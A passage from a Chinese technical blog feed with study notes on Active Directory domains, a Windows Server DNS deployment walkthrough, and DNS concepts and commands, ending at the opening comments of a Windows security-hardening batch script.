title="先决条件"></a>先决条件</h2><ul><li>安装者必须是本地管理员权限</li><li>操作系统版本必须是服务器版本（Web版除外）</li><li>本地至少一个分区是NTFS文件格式</li><li>配置静态IP和子网掩码</li><li>磁盘空间足够</li></ul><h1 id="额外域控制器"><a href="#额外域控制器" class="headerlink" title="额外域控制器"></a>额外域控制器</h1><h2 id="为什么要安装额外域控"><a href="#为什么要安装额外域控" class="headerlink" title="为什么要安装额外域控"></a>为什么要安装额外域控</h2><ul><li>容错：当域中的域控制器出现故障时，其他额外域控制器仍能提供域服务.</li><li>负载均衡：适用大型网络环境，加快用户登录域的审核速度.</li><li>更易于用户的连接：适用于分支机构，提高登录速度.</li></ul><h2 id="安装额外域控制器"><a href="#安装额外域控制器" class="headerlink" title="安装额外域控制器"></a>安装额外域控制器</h2><h3 id="先决条件-1"><a href="#先决条件-1" class="headerlink" title="先决条件"></a>先决条件</h3><ul><li>必须具有域管理员身份</li><li>正确的TCP/IP设置  （能保证和域控制通信，DNS设置正确）</li><li>操作系统版本必须受当前域功能级别支持  （向下兼容）</li></ul><p>注意事项:</p><ul><li>安装过程中不需要加入域也能成功</li><li>安装完成后，AD中所有数据是同步的</li></ul><h1 id="部署成员计算机"><a href="#部署成员计算机" class="headerlink" title="部署成员计算机"></a>部署成员计算机</h1><h2 id="先决条件-2"><a href="#先决条件-2" class="headerlink" title="先决条件"></a>先决条件</h2><ul><li>客户机必须和域控制器是连通的</li><li>一定要配置正确的DNS地址 （否则无法解析域名，也就无法加入域）</li></ul><h1 id="域的管理"><a href="#域的管理" class="headerlink" title="域的管理"></a>域的管理</h1><h2 id="功能级别提升（域、林）"><a href="#功能级别提升（域、林）" class="headerlink" title="功能级别提升（域、林）"></a>功能级别提升（域、林）</h2><ul><li><code>Windows 2000纯模式</code></li><li><code>Windows Server 2003</code></li><li><code>Windows Server 2008</code></li><li><code>Windows Server 2008 R2</code><br><font color="blue">林功能级别限制域功能级别,域功能级别限制域控制器的操作系统</font><br><font color="blue">域控制器的操作系统&lt;=域功能级别&lt;=林功能级别</font></li></ul><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>命令规则：</p><ul><li>唯一的用户登录名  （登录名在域中是唯一的；显示名在OU中唯一）</li><li>最长20字符</li><li>不能出现非法字符  （<code>&lt;  &gt;  ?  !  /   \  |   = 等</code>）</li></ul><h2 id="OU管理"><a href="#OU管理" class="headerlink" title="OU管理"></a>OU管理</h2><p>​        是活动目录中的一个容器（组织单位）；可以存放用户、组、计算机、OU等其他对象</p><p>创建原则：</p><ul><li>基于部门的</li><li>基于地理位置的</li><li>基于对象类型的<br>特别注意：OU中不能包含来自其他域中的对象</li></ul><h2 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h2><p>组类型：</p><ul><li>安全组：主要是用于设置用户安全权限的</li><li>通讯组：主要用于电子邮件通信的</li></ul><p>组作用域：</p><ul><li>本地域组：使用范围是本域</li><li>全局组：使用范围是整个林及信任域</li><li>通用组：使用范围是整个林及信任域 （用户的登录或查询速度更快）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS服务部署</title>
      <link href="/2020/11/16/dns-fu-wu-bu-shu/"/>
      <url>/2020/11/16/dns-fu-wu-bu-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="安装DNS服务器角色"><a href="#安装DNS服务器角色" class="headerlink" title="安装DNS服务器角色"></a>安装DNS服务器角色</h1><p><strong>环境描述</strong>：</p><p>​        “<code>sbwyl</code>”公司新组建了一个内部局域网，需要一台DNS服务器为内部用户提供域名解析服务，该如何搭建DNS服务器</p><p><strong>具体步骤如下</strong>：</p><ul><li>首先从虚拟机开启一台Server 2008 R2的服务器用于搭建DNS服务器；</li><li>在开启一台Windows 7的计算机用于模拟客户端；</li><li>分别给服务器和客户机配置IP地址，在客户机配置IP地址时DNS要指向服务器IP地址；</li><li>关闭两个系统的防火墙，并且能够互相拼通。</li></ul><ol><li><p>打开【服务器管理器】管理界面 → 角色 → 添加角色 → 在弹出“开始之前对话框”中点击【下一步】 → 在“选择服务器角色”对话框中选择【DNS服务器】单击左边复选框，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/添加DNS角色.png" alt="添加DNS角色"></center></li><li><p>点击【下一步】按钮，显示DNS服务器简介界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/DNS服务器简介.png" alt="DNS服务器简介"></center></li><li><p>点击【下一步】按钮，进入安装确认界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/DNS安装确认.png" alt="DNS安装确认"></center></li><li><p>点击【下一步】按钮，显示DNS安装进度界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/DNS安装进度.png" alt="DNS安装进度"></center></li><li><p>显示如下图所示表示DNS服务安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/DNS安装成功.png" alt="DNS安装成功"></center></li></ol><h1 id="创建正向查询域"><a href="#创建正向查询域" class="headerlink" title="创建正向查询域"></a>创建正向查询域</h1><ol><li><p>打开DNS管理器。开始 → 管理工具 → 选择【DNS】，DNS管理器界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/DNS管理器界面.png" alt="DNS管理器界面"></center></li><li><p>右键【WIN-H69V7LS 7Q7D】选择【新建区域…】选项，显示新建区域向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建区域向导.png" alt="新建区域向导"></center></li><li><p>点击【下一步】按钮进入区域类型选择界面，这里选择【主要区域】选项，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/区域类型设置.png" alt="区域类型设置"></center></li><li><p>点击【下一步】按钮进入正向或反向查询区域设置，这里选择【正向查找区域】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/设置正向查询.png" alt="设置正向查询"></center></li><li><p>点击【下一步】按钮后进入区域名称设置界面，设置区域名称为<code>sbwyl.com</code>操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/区域名称设置.png" alt="区域名称设置"></center></li><li><p>点击【下一步】按钮进入区域文件设置界面，这里选择创建新文件选项操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/区域文件设置.png" alt="区域文件设置"></center></li><li><p>点击【下一步】按钮，进入动态更新设置界面，这里采用默认设置，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/动态更新设置.png" alt="动态更新设置"></center></li><li><p>点击【下一步】按钮进入设置信息核对界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/设置核对界面.png" alt="设置核对界面"></center></li><li><p>点击【完成】按钮后，操作结果显示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/创建正向查询结果.png" alt="创建正向查询结果"></center></li></ol><h1 id="创建反向查询域"><a href="#创建反向查询域" class="headerlink" title="创建反向查询域"></a>创建反向查询域</h1><ol><li><p>右键【反向查询区域】选择【新建区域…】选项，显示新建区域向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建区域向导.png" alt="新建区域向导"></center></li><li><p>点击【下一步】按钮进入区域类型选择界面，这里选择【主要区域】选项，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/区域类型设置.png" alt="区域类型设置"></center></li><li><p>点击【下一步】按钮进入反向查询区域设置，这里选择【IPv4反向查找区域】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/IPv4反向查询.png" alt="IPv4反向查询"></center></li><li><p>点击【下一步】按钮，在新页面中设置网络ID为<code>192.168.1</code>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/反向查询网络ID设置.png" alt="反向查询网络ID设置"></center></li><li><p>点击【下一步】按钮，进入区域文件设置界面，采用默认设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/反向查询区域文件设置.png" alt="反向查询区域文件设置"></center></li><li><p>点击【下一步】按钮，进入动态更新设置界面，这里采用默认设置，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/动态更新设置.png" alt="动态更新设置"></center></li><li><p>点击【下一步】按钮进入设置信息核对界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/反向查询核对界面.png" alt="反向查询核对界面"></center></li><li><p>点击【完成】按钮后，操作结果显示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/反向查询结果.png" alt="反向查询结果"></center></li></ol><h1 id="创建主机记录"><a href="#创建主机记录" class="headerlink" title="创建主机记录"></a>创建主机记录</h1><p>​        假设sbwyl公司有一台计算机的FQDN（“FQDN”的意思是：正式域名）为：<code>www.sbwyl.com</code>，IP地址是<code>192.168.1.222</code>，如何在区域“sbwyl.com”下创建该主机记录</p><ol><li><p>新建主机。在DNS管理器的左边窗口中右键【正向查询区域】下面的【sbwyl.com】，选择【新建主机…】选项操作界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建主机.png" alt="新建主机"></center></li><li><p>新建别名。在DNS管理器的左侧窗口中右键【sbwyl.com】选择【新建别名…】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建别名.png" alt="新建别名"></center></li><li><p>新建指针。右键【1.168.192.in-addr.arpa】选择【新建指针…】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建指针.png" alt="新建指针"></center></li></ol><h1 id="新建辅助区域"><a href="#新建辅助区域" class="headerlink" title="新建辅助区域"></a>新建辅助区域</h1><p>​        “sbwyl”公司规模做大为了减轻单台DNS的负载，现在需要将本台DNS服务器的内容保存到另一台DNS服务器中。</p><ol><li><p>在Server2中配置IP地址，DNS地址要指向Server1服务器的IP地址。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/设置Server2的IP信息.png" alt="设置Server2的IP信息"></center></li><li><p>在Server2中上安装“DNS”服务器后右键【正向查找区域】后选择【新建区域】</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建区域向导.png" alt="新建区域向导"></center></li><li><p>右键【下一步】按钮，进入区域设置界面，选择【辅助区域】，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/辅助区域选择.png" alt="辅助区域选择"></center></li><li><p>点击【下一步】按钮，显示区域名称设置界面，操作结果如下图所示。（注：此处输入的区域名称要和源区域完全相同）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/辅助区域名称设置1.png" alt="辅助区域名称设置"></center></li><li><p>点击【下一步】按钮，进入主DNS设置界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/主DNS设置1.png" alt="主DNS设置"></center></li><li><p>点击【下一步】按钮，显示区域设置核对界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/辅助区域设置核对1.png" alt="辅助区域设置核对"></center></li><li><p>Server1区域传送设置。在Server1中打开“DNS管理器”，右键<code>sbwyl.com</code>选择【属性】选项，点击【区域传送】选项卡，设置服务器IP地址操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/设置区域传送.png" alt="设置区域传送"></center></li></ol><h1 id="新建子域"><a href="#新建子域" class="headerlink" title="新建子域"></a>新建子域</h1><p>​        “sbwyl”公司在北京成立了分公司，公司网络由总公司直接管理，管理员想通过部门进行管理DNS记录。</p><ol><li><p>打开DNS服务器右键“sbwyl.com”选择【新建域…】选项，在显示的界面中设置子域名称，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建子域.png" alt="新建子域"></center></li><li><p>在新建的域中可以新建主机和别名。</p></li></ol><h1 id="新建委派"><a href="#新建委派" class="headerlink" title="新建委派"></a>新建委派</h1><p>​        公司有一台DNS服务器，其内部局域网使用“sbwyl.com”作为域名，现在该公司在上海成立分公司，上海公司使用专线和总公司连接，上海分公司计划使用“sh.sbwyl.com”作为域名别切在本地解析。</p><ol><li><p>右键“sbwyl.com”选择【新建委派…】选项，显示新建委派向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新进委派向导.png" alt="新进委派向导"></center></li><li><p>点击【下一步】按钮，在受委派域名设置界面中设置委派的域，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/设置受委派域名.png" alt="设置受委派域名"></center></li><li><p>点击【下一步】按钮，进入名称服务器设置界面，设置名称服务器操作结果如下图所示。（Server2服务器主机地址，用来模拟分公司）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/委派名称服务器设置.png" alt="委派名称服务器设置"></center></li><li><p>点击【下一步】按钮，显示新建委派完成界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建委派完成.png" alt="新建委派完成"></center></li><li><p>新建委派结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/新建委派结果.png" alt="新建委派结果"></center></li></ol><h1 id="转发器"><a href="#转发器" class="headerlink" title="转发器"></a>转发器</h1><p>​        公司有一台DNS服务器和一个外部DNS服务器，为了安全内网DNS服务器不能和外网通信，但是配置内网DNS服务器IP地址的员工经常需要访问外网网站。</p><ol><li><p>打开“DNS管理器”，右键：“CC”，选择【属性】选项，打开【转发器】转发器选项，添加转发IP地址操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DNSServerDemo1/转发器设置.png" alt="转发器设置"></center></li><li><p>点击【确定】后，缓存DNS设置成功。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> 服务部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS服务</title>
      <link href="/2020/11/14/dns-fu-wu/"/>
      <url>/2020/11/14/dns-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-DNS概述"><a href="#0x01-DNS概述" class="headerlink" title="0x01 DNS概述"></a>0x01 DNS概述</h1><h2 id="域名如何解析"><a href="#域名如何解析" class="headerlink" title="域名如何解析"></a>域名如何解析</h2><p>​        根据TCP/TP中对HTTP协议的规则，在进行数据传输过程中报文需要的包含：源IP地址和目的IP地址，域名不是IP地址因此在访问时需要解析除域名对用的IP地址。</p><ol><li>早期使用<code>Hosts</code>文件解析域名<ul><li>主机名称重复</li><li>主机维护困难</li></ul></li><li>DNS（Domain Name System域名系统）：专门对域名进行解析的协议，安装DNS Server的服务器被称为DNS服务器。<ul><li>分布式</li><li>层次性</li></ul></li></ol><h2 id="域名结构"><a href="#域名结构" class="headerlink" title="域名结构"></a>域名结构</h2><p><code>FQDN（完全合格域名）= 主机名.DNS后缀</code></p><pre class=" language-html"><code class="language-html">www.jishubu.baidu.com.www:主机名jishubu:三级域名baidu:二级域名com:一级域名(顶级域名).:根</code></pre><p><strong>顶级域名</strong>:</p><ul><li>国家代码标识某个国家（如cn、uk等）</li><li>国际性组织在int下</li><li>国际通用<ul><li>com：商业部门</li><li>net：网络服务机构</li><li>org：民间组织团体</li><li>edu：教育部门</li><li>gov：政府部门</li><li>mil：军事部门</li></ul></li></ul><p><strong>二级域名</strong>：由各个国家自行确定</p><ul><li>类别域名（ac、com、edu、gov、net、org工6个）</li><li>行政区域名（34个，如bj、js等）</li></ul><p><strong>三级域名</strong>：二级域名下注册的公司、单位等</p><p><strong>主机名</strong>：服务所在服务器</p><h2 id="DNS区域"><a href="#DNS区域" class="headerlink" title="DNS区域"></a>DNS区域</h2><p>​        ns区域是为了便于根据实际情况来分散DNS名称管理工作的负荷，将DNS名称空间划分为区域（zone）来进行管理</p><ul><li>域名空间树形结构的一部分</li><li>将域名空间根据需要划分为较小区域</li><li>一台DNS服务器内可存放多个区域文件</li><li>一个区域所包含的范围在一个域名空间中是连续的</li></ul><h2 id="DNS服务器分类"><a href="#DNS服务器分类" class="headerlink" title="DNS服务器分类"></a>DNS服务器分类</h2><ol><li>主要名称服务器（主DNS）<ul><li>存放该区域中相关设置的DNS服务器（可修改）</li><li>其存放的是区域文件的正本数据</li><li>权威应答（查文件得到的结果)</li></ul></li><li>辅助名称服务器（辅DNS）<ul><li>从主DNS服务器中复制数据</li><li>数据为副本无法修改</li><li>权威应答（查文件得到的结果）</li></ul></li><li>主控名称服务器<ul><li>提供区域数据复制的DNS服务器（多个主DNS服务器谁提供辅助DNS的区域复制，谁就是主控名称服务器）</li></ul></li><li>Cache-Only名称服务器（缓存DNS）<ul><li>将查询到的数据保存在高速缓存中</li><li>非权威应答（查缓存）</li></ul></li></ol><h2 id="DNS查询方式"><a href="#DNS查询方式" class="headerlink" title="DNS查询方式"></a>DNS查询方式</h2><ol><li><p>从查询方式分类</p><ul><li><p>递归查询：客户端得到结果只能是成功或失败</p></li><li><p>迭代查询：</p><ul><li><p>DNS服务器如有客户机请求数据则返回正确地址</p></li><li><p>DNS服务器没有请求数据则返回一个指针</p></li></ul></li></ul></li><li><p>从查询内容分类</p><ul><li><p>正向查询：由域名查找IP地址 </p></li><li><p>反向查询：由IP地址查找域名 </p></li></ul></li></ol><h2 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h2><ol><li>输入一个HTTP网址 <code>www.taobao.com</code>【下单后收货时发现货物有瑕疵，计划换货】</li><li>通过DNS解析出这个网址的IP【找出卖家地址】<ol><li>此时操作系统会先检查本地<code>hosts</code>文件是否有这个网址的映射关系，如果有，就先调用这个IP地址映射，完成解析；如果没有执行2。</li><li>若<code>hosts</code>里没有，则查找本地DNS解析器缓存，若有映射，直接返回，完成解析；若无映射执行3。</li><li>若前两者没有，查找<code>TCP/IP</code>参数中设置的首选DNS服务器（此处称为本地DNS服务器）。若查询的域名包含在本地配置区域资源中，则返回解析结果给客户机，完成解析。（此解析具有权威性）若要查询的域名，不由本地DNS服务器区域解析，但该服务器缓存了网址的映射关系，则调用这个IP地址映射，完成解析。（此解析不具权威性）。若都没有则执行4。</li><li>若前三者没有，则根据本地DNS服务器的设置（是否设置转发器）进行查询。最后都由本地DNS服务器返回IP地址给客户机。<ul><li><strong>采用未转发模式</strong>：本地DNS将请求发至13台根DNS，根DNS收到后会判断这个域名.com是谁来授权管理，返回一个负责该顶级域名的服务器的IP。收到IP信息后，本地DNS联系负责.com的服务器，收到请求后进行解析，找到一个管理baidu.com的DNS服务器的IP，返回给本地DNS服务器。收到IP信息后，重复上述动作，直到找到<code>www.taobao.com</code>的IP地址。</li><li><strong>采用转发模式</strong>：本地DNS服务器将请求发送至上一级DNS解析器，由上一级DNS解析器进行解析。上一级若不能解析，或找根DNS或把请求转至上上级，以此循环。</li></ul></li></ol></li><li>有了IP后，通过IP地址找到对应服务器，请求与对方建立TCP连接（先通过子网掩码判断下是否是同一个网络的。如果不在同一个网络，需要通过网关转发）【跟客服扯皮，达成换货共识】</li><li>建立连接后，客户端向服务器发送HTTP Request（请求）包数据【寄快递】</li><li>服务器收到请求后，进行处理，返回HTTP Response（响应）包数据【卖家收到快递，寄回换的货】</li><li>客户端收到服务器的响应后，开始渲染这个Response包里的主体（body），收到全部的内容后断开与该服务器之间的TCP连接【收到货，点击确定收货，完成交易】</li></ol><p>总结：<br><font color="red"><code>www.taobao.com</code> → 本地HOSTS(无) → DNS本地缓存 → DNS服务器 → 根DNS–顶级域名DNS服务器 → 公司域名DNS服务器–找到主机对应IP → 本地DNS服务器 → 本地主机 → 完成解析得知ip</font></p><h2 id="资源记录类型"><a href="#资源记录类型" class="headerlink" title="资源记录类型"></a>资源记录类型</h2><table><thead><tr><th align="center">资源记录</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">SOA（起始授权机构）</td><td align="left">定义了该域中的权威名称服务器</td></tr><tr><td align="center">NS（名称服务器）</td><td align="left">表示某区域的权威服务器和SQA中指定的该区域的主要服务器和辅助服务器</td></tr><tr><td align="center">A（主机）</td><td align="left">列出了区域中FQDN（完全合格的域名）到IP地址的映射</td></tr><tr><td align="center">PTR（指针）</td><td align="left">相对于A资源记录，PTR记录是把IP地址映射到FQDN</td></tr><tr><td align="center">MX</td><td align="left">邮件交换器记录，向指定的邮件交换主机提供消息路由</td></tr><tr><td align="center">CNAME（别名）</td><td align="left">将多个名字映射到同一台计算机上，便于用户访问</td></tr></tbody></table><h1 id="0x02-配置DNS服务"><a href="#0x02-配置DNS服务" class="headerlink" title="0x02 配置DNS服务"></a>0x02 配置DNS服务</h1><h2 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h2><ul><li>有固定的IP地址</li><li>安装并启动DNS服务</li><li>有区域文件，配置转发器，或者配置根提示</li></ul><h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><ol><li>安装并启动DNS服务</li><li>新建A记录</li><li>配置转发器，或者配置跟提示</li></ol><h1 id="0x03-管理DNS服务"><a href="#0x03-管理DNS服务" class="headerlink" title="0x03 管理DNS服务"></a>0x03 管理DNS服务</h1><h2 id="子域"><a href="#子域" class="headerlink" title="子域"></a>子域</h2><p>​        可以将同一网络中的不同用户归于不同的子域，然后给不同资源创建不同的记录，实现不同的功能</p><h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><p>区域中的子域过多时:</p><ul><li>维护起来不方便</li><li>域名查询量的瓶颈</li></ul><p>新建委派可以将子域委派到其他服务器维护（）<br>子域与委派的对比</p><ul><li>子域的资源在父区域文件中，子域的权威服务器是父区域的权威服务器</li><li>委派有独立的区域文件，给新域指定新的权威服务器</li></ul><h2 id="区域传送"><a href="#区域传送" class="headerlink" title="区域传送"></a>区域传送</h2><ol><li>区域传送（减轻单台DNS服务器负载）<ul><li>将一个区域文件复制到多个DNS服务器的过程</li><li>从主服务器上将区域文件复制到辅助服务器</li></ul></li></ol><h2 id="转发器"><a href="#转发器" class="headerlink" title="转发器"></a>转发器</h2><p>​        具有特殊功能和应用的DNS服务器</p><ol><li>将本地DNS服务器无法解析的查询，转发到网络上其它DNS服务器 </li><li>转发到转发器的查询一般为递归查询</li><li>可以设置条件转发</li></ol><h2 id="根提示"><a href="#根提示" class="headerlink" title="根提示"></a>根提示</h2><ol><li>使非根域的DNS服务器可查到根域DNS服务器</li><li>根提示与转发器使用顺序<ul><li>DNS优先使用转发器</li></ul></li></ol><h1 id="0x04-配置DNS客户端"><a href="#0x04-配置DNS客户端" class="headerlink" title="0x04 配置DNS客户端"></a>0x04 配置DNS客户端</h1><h2 id="配置静态DNS"><a href="#配置静态DNS" class="headerlink" title="配置静态DNS"></a>配置静态DNS</h2><pre class=" language-powershell"><code class="language-powershell">netsh interface ip <span class="token function">set</span> dnsserver <span class="token string">"本地连接"</span> static 8<span class="token punctuation">.</span>8<span class="token punctuation">.</span>8<span class="token punctuation">.</span>8</code></pre><h2 id="配置动态DNS"><a href="#配置动态DNS" class="headerlink" title="配置动态DNS"></a>配置动态DNS</h2><pre class=" language-powershell"><code class="language-powershell">netsh interface ip <span class="token function">set</span> dnsserver <span class="token string">"本地连接"</span> dhcp</code></pre><h2 id="DNS相关命令"><a href="#DNS相关命令" class="headerlink" title="DNS相关命令"></a>DNS相关命令</h2><pre class=" language-powershell"><code class="language-powershell">1<span class="token punctuation">.</span>清空本地DNS缓存记录ipconfig <span class="token operator">/</span>flushdns2<span class="token punctuation">.</span>测试DNS服务器nslookup3<span class="token punctuation">.</span>查询域名相关信息（https:<span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>csdn<span class="token punctuation">.</span>net<span class="token operator">/</span>qq_15727809<span class="token operator">/</span>article<span class="token operator">/</span>details<span class="token operator">/</span>70052534）nslookup <span class="token operator">-</span>qt=<span class="token function">type</span> 域名 DNSip或是域名<span class="token function">type</span>=A 地址记录AAAA 地址记录CNAME 别名记录HINFO 硬件配置记录，包括CPU、操作系统信息MX 邮件服务器记录NS 名字服务器记录PTR 反向记录1<span class="token punctuation">.</span>例如： nslookup <span class="token operator">-</span>qt=mx baidu<span class="token punctuation">.</span>com 8<span class="token punctuation">.</span>8<span class="token punctuation">.</span>8<span class="token punctuation">.</span>82<span class="token punctuation">.</span>nslookup <span class="token operator">-</span>d www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com可以看到本地ISP服务器上缓存的时间，就算刷新了本机操作系统缓存，ISP上仍然存<span class="token punctuation">.</span>3<span class="token punctuation">.</span>>nslookup <span class="token operator">-</span>qt=cname lanou<span class="token punctuation">.</span>com 202<span class="token punctuation">.</span>106<span class="token punctuation">.</span>0<span class="token punctuation">.</span>20primary name server = ns<span class="token punctuation">.</span>163<span class="token punctuation">.</span>com主要名字服务器（DNS记录文件所在的主机位置    ）responsible mail addr = admin<span class="token punctuation">.</span>NEASE<span class="token punctuation">.</span>NET记录主机管理员邮件地址admin@nease<span class="token punctuation">.</span>netserial = 20010348区域传递序号，又叫文件版本，当发生区域复制时，该域用来指示区域信息的更新情况。格式为：yyyymmddnn<span class="token punctuation">,</span>nn代表这一天是第几次修改，辅助DNS通过比较这个号来决定是否复制该信息。大表示新。refresh = 10800 <span class="token punctuation">(</span>3 hours<span class="token punctuation">)</span>重刷新时间，当区域复制发生时，指定区域复制的更新时间间隔（告诉该区域的辅助DNS间隔多久检查该区域的数据是否是最新的）retry = 3600 <span class="token punctuation">(</span>1 hour<span class="token punctuation">)</span>重试时间，区域复制失败时，重新尝试的时间（要比刷新时间短）expire = 360000 <span class="token punctuation">(</span>4 days 4 hours<span class="token punctuation">)</span>有效时间，区域复制在有效时间内不能完成，则终止更新（设置时间要比刷新和重试时间长）default TTL = 3600 <span class="token punctuation">(</span>1 hour<span class="token punctuation">)</span>表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows安全加固批处理脚本</title>
      <link href="/2020/11/13/windows-an-quan-jia-gu-pi-chu-li-jiao-ben/"/>
      <url>/2020/11/13/windows-an-quan-jia-gu-pi-chu-li-jiao-ben/</url>
      
        <content type="html"><![CDATA[<p>​        此安全加固脚本以文件驱动，可在<code>win.ini</code>文件中设置部分参数，其他参数脚本中已默认设置，若想要修改则需要打开批处理中进行设置。</p><h1 id="WinSecurityReinforcement-bat内容"><a href="#WinSecurityReinforcement-bat内容" class="headerlink" title="WinSecurityReinforcement.bat内容"></a>WinSecurityReinforcement.bat内容</h1><pre class=" language-powershell"><code class="language-powershell">@rem 适用操作系统：@rem Windows Server 2008@rem Windows Server 2012@rem 脚本更新@rem 20180116 发现【启用并正确配置WSUS】部分配置不生效<span class="token punctuation">,</span>添加部分注册表配置<span class="token punctuation">,</span>配置完重启生效<span class="token punctuation">,</span>不过组策略里还是显示未配置<span class="token punctuation">,</span>暂未找到原因。@rem 20180122 在“正确配置WSUS”项中新增了一项配置：对于有已登录用户的计算机<span class="token punctuation">,</span>计划的自动更新安装不执行重新启动。@rem 20180208 更新关于组策略不显示自动更新相关配置的解释：组策略的修改结果会保存在两个地方：1<span class="token punctuation">.</span> 注册表  2<span class="token punctuation">.</span> 组策略历史文件（C:\WINDOWS\system32\GroupPolicy\Machine\Registry<span class="token punctuation">)</span>注册表里的结果是给应用对象读取来生效的；组策略历史文件是组策略读取的，只是组策略的状态记录，所以组策略里显示“未配置”。@rem 20180614 注释“禁用DHCP Client服务”<span class="token punctuation">,</span>Server 2012中Network Location Awareness服务和DHCP Client存在依存关系<span class="token punctuation">,</span>禁用DHCP服务会导致网络配置失效@rem 20190711 配置参数分离<span class="token punctuation">,</span>添加NTP配置@rem 20201113 禁用未登录前关机权限<span class="token punctuation">,</span>限制远程登录空闲断开时间（默认15分钟）@<span class="token function">echo</span> offtitle Windows 安全加固脚本color 